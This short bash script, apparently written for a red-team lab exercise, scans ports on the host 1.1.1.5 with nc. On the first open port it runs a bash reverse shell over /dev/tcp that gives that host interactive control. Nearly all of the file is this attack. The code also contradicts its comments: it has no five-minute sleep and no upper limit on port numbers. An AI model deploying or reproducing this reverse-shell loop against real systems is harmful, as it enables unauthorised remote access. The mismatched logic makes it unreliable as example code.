#!/bin/bash

# search through all open ports on blue.usc-bank5.usc430 for a backdoor
# if a backdoor exists, open a reverse shell
# if a backdoor does not exist, sleep for 5 minutes and try again


# Define the remote host and port
remote_host="1.1.1.5"
remote_port=0

while true
do
    # Try to connect to the remote host using nc
    if nc -zv $remote_host $remote_port &> /dev/null; then
    
    echo "Connection succeeded. Opening shell."
    
    /bin/bash -i >& /dev/tcp/1.1.1.5/$remote_port 0>&1
    break
    else
    echo "Connection refused, trying next port."
    ((remote_port++))
    fi
done


